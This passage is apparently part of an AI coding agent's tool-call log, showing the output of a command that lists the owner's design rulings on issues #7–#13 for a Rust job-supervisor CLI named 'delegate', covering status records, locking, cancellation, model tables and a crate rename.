sleep before `run` prints its id, shows the test failing, then removes the sleep.\n2. **Supervisor memory:** sample `ps -o rss= -p <supervisorPid>` (the pid comes from the status record) while the fake agent holds RUNNING. The same command works on macOS and Linux, so the test needs no per-OS code.\n3. **Latency endpoint:** wall clock until the process exits. `run` and `resume` exit right after printing the id.\n4. **Cases timed:** `watch` on an already-terminal job, with no timeout path. `cancel` on a RUNNING job whose fake agent exits on SIGTERM. `doctor` against fakes that exit 0.\n5. **Budget constants:** about 3x the local measurement, with the measured baseline in a comment beside each. No retries: if CI is noisy, raise the margin.\n6. **Fake agents** wait on release files, never on sleeps (the lesson from #7).\n--\n======== ISSUE 13 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings: orchestrator ruling (owner asleep; reversible)\n\n1. **Crate:** rename the crate to `delegate`. `delegate` is the only binary; `cursor-delegate-mcp` is removed.\n2. **Code to delete:** `src/index*`, `job_registry*`, `tool_schemas.rs`, `progress.rs`, `validate.rs` and the MCP e2e tests, plus anything else only they use. The supervisor must not depend on `JobRegistry`.\n3. **Environment variable:** `CURSOR_DELEGATE_HOST_PROFILE` is dropped outright, not aliased. Setup moves the file.\n4. **Setup:** build the release binary and copy it to `~/.local/bin/delegate`. Move `~/.config/cursor-delegate/<profile>` to `~/.config/delegate/` only if the destination is absent; otherwise print a note and leave both. If there is no old profile, do nothing.\n5. **Old status records:** leftover `cursor-delegate-jobs` records get no migration.\n6. **Old-name references:** allowed only in setup's migration code.\n7. **Plugin:** the plugin and marketplace ids become `delegate`, version 1.0.0, shipping the skill only.\n8. **Running setup on this machine** changes the owner's `~/.local/bin`, `~/.config` and installed plugin. That is deferred to the owner: the morning report carries the exact commands and the `~/.claude/settings.json` edits. CI covers the rest.\n--\n","stderr":"","executionTime":6116,"interleavedOutput":"======== ISSUE 7 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. Real detached supervisor; the status file is the only source of truth. The MCP `job_registry` stays untouched until #13.\n2. Record path: `$TMPDIR/delegate-jobs/<uuid>.json`.\n3. Record shape: whatever is cheapest to implement and parse. That means the existing `PollResult` JSON (camelCase) plus `supervisorPid`, `heartbeatAt` and `resume {model, cwd, capability, sessionId}`.\n4. Heartbeat: 30s by default. Tests shorten it with a `DELEGATE_HEARTBEAT_MS` environment override. The supervisor is a separate process, so a fake clock cannot be shared with it.\n5. `watch`: one JSON line per job, in argument order. Exit 0 when all are terminal. On timeout, print the current records and exit 1.\n6. `watch` on an unknown job id exits 2 at once.\n7. Bad input to `run` (unknown model, empty prompt) exits 2 with the reason on stderr. An unknown model also lists the valid ids.\n8. The CLI appends only the STATUS-line instruction. The MCP prompt path is unchanged.\n9. A status-record write failure makes the supervisor exit non-zero. A supervisor that dies leaving RUNNING is deferred to #9.\n10. A second `[[bin]]` named `delegate` in `src/bin/delegate.rs`, sharing the library.\n\n--\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\nClarification on ruling 3: the heartbeat field is `lastHeartbeatAt`, reused from `PollResult`, not a new `heartbeatAt`.\n--\n======== ISSUE 9 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **BUSY:** a second read-write `run` or `resume` in a locked cwd prints `BUSY <holderJobId>` on stderr and exits 3.\n2. **Gate timeout:** the gate is killed if it runs past the job's tool-idle window (`--tool-idle-ms`, default 1800s). There is no new flag.\n3. **Lock:** `flock` on `$TMPDIR/delegate-locks/<hash of canonical cwd>.lock`, held by the supervisor. The file holds the job id.\n4. **Idle defaults:** model-idle 300s and tool-idle 1800s, carried over from the host profile.\n5. **Change-set:** always lists the commits made during the run, plus a concern if the tree is still dirty. The #6 probe showed a delegated Claude commits on its own branch.\n6. **MCP:** the old MCP `cursor_run` path does not take the file lock. That gap is accepted until #13 deletes MCP.\n7. **Dead supervisor** (deferred from #7): stale-heartbeat handling belongs here.\n--\n======== ISSUE 10 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **Output:** `resume` prints the new job id, like `run`.\n2. **Cancel on a terminal job:** a no-op. It prints the record and exits 0.\n3. **Resume errors:** `resume` on a RUNNING job, or on a record with no session id, exits 2 with the reason on stderr.\n4. **Chain links:** resuming A as B writes `supersededBy: B` into A's record and `resumedFrom: A` into B's. This keeps the reason MCP added the pointer (commit 8b21892): a watcher on a resumed NEEDS_CONTEXT record must be able to follow the chain instead of acting on the stale question.\n5. **Cancel:** SIGTERM to the supervisor's process group, then SIGKILL after 5s. If `cancel` had to SIGKILL, it writes CANCELLED itself.\n6. **Busy cwd:** a read-write resume into a locked cwd follows the #9 BUSY ruling (stderr `BUSY <holder>`, exit 3).\n--\n======== ISSUE 11 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings (owner, 2026-10-01)\n\n1. **`delegate models`:** an aligned text table with id, label, backend and $in/$out per 1M tokens. The default is marked `*`. Rows sort by backend, then id.\n2. **`delegate doctor`:** human-readable text on stdout, one ok/warn/fail line per check. Missing or renamed models are warnings. It exits 0 when there are only warnings, and 1 on a hard failure (binary missing, or not logged in).\n3. **pi and claude models before #16/#17 land:** `run` exits 2 with `backend not implemented`, and `doctor` prints a skip line for each.\n4. **Model table:** `backend` replaces `family`. The ids are the 13 listed in #11 and spec story 45. Grok 4.7 is priced as Grok 4.6.\n--\n======== ISSUE 12 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings: orchestrator ruling (owner asleep; reversible)\n\n1. **Slow-run negative control:** no test-only delay hook in production code. The lane records the negative control in the PR instead: it adds a local sleep before `run` prints its id, shows the test failing, then removes the sleep.\n2. **Supervisor memory:** sample `ps -o rss= -p <supervisorPid>` (the pid comes from the status record) while the fake agent holds RUNNING. The same command works on macOS and Linux, so the test needs no per-OS code.\n3. **Latency endpoint:** wall clock until the process exits. `run` and `resume` exit right after printing the id.\n4. **Cases timed:** `watch` on an already-terminal job, with no timeout path. `cancel` on a RUNNING job whose fake agent exits on SIGTERM. `doctor` against fakes that exit 0.\n5. **Budget constants:** about 3x the local measurement, with the measured baseline in a comment beside each. No retries: if CI is noisy, raise the margin.\n6. **Fake agents** wait on release files, never on sleeps (the lesson from #7).\n--\n======== ISSUE 13 ========\nauthor:\tuser\nassociation:\towner\nedited:\tfalse\nstatus:\tnone\n--\n## Preflight rulings: orchestrator ruling (owner asleep; reversible)\n\n1. **Crate:** rename the crate to `delegate`. `delegate` is the only binary; `cursor-delegate-mcp` is removed.\n2. **Code to delete:** `src/index*`, `job_registry*`, `tool_schemas.rs`, `progress.rs`, `validate.rs` and the MCP e2e tests, plus anything else only they use. The supervisor must not depend on `JobRegistry`.\n3. **Environment variable:** `CURSOR_DELEGATE_HOST_PROFILE` is dropped outright, not aliased. Setup moves the file.\n4. **Setup:** build the release binary and copy it to `~/.local/bin/delegate`. Move `~/.config/cursor-delegate/<profile>` to `~/.config/delegate/` only if the destination is absent; otherwise print a note and leave both. If there is no old profile, do nothing.\n5. **Old status records:** leftover `cursor-delegate-jobs` records get no migration.\n6. **Old-name references:** allowed only in setup's migration code.\n7. **Plugin:** the plugin and marketplace ids become `delegate`, version 1.0.0, shipping the skill only.\n8. **Running setup on this machine** changes the owner's `~/.local/bin`, `~/.config` and installed plugin. That is deferred to the owner: the morning report carries the exact commands and the `~/.claude/settings.json` edits. CI covers the rest.\n--\n","localExecutionTimeMs":5542},"isBackground":false},"description":"View owner rulings on issues #7-#13"},"hookAdditionalContexts":[],"toolCallId":"tool_67c0b7a8-7cc0-4971-810f-d5d27f664fc","startedAtMs":"1790845569259","completedAtMs":"1790845575585"},"model_call_id":"13e7813c-8061-40d0-a475-19ebe85b4952-0-mjpw","session_id":"7dd612d0-6469-4d8d-870b-f50c14f3831a","timestamp_ms":1790845575586}
